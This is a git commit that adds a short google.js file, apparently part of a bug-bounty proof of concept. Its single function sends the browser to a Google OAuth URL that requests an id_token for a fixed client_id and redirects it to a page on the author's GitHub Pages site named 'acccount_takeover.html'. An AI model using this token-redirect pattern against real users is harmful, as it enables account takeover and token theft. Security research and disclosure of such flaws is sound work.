a28dea33e34875cb0c2742fbf16b9f74e4d3bb36
Moad Akhraz <77294440+mdakh404@users.noreply.github.com>
2024-03-06 15:53:15 -0800

    Add files via upload

---
+++ google.js
@@ -0,0 +1,5 @@
+function googleLogin() {
+   
+    window.location.href = "https://accounts.google.com/o/oauth2/v2/auth?scope=https://www.googleapis.com/auth/userinfo.email&access_type=offline&response_type=id_token&redirect_uri=https://mdakh404.github.io/.pocs/acccount_takeover.html&client_id=181822979128-0p2iaiila69sm33i8gg0a1coc4i1bddf.apps.googleusercontent.com&nonce=test"
+
+}
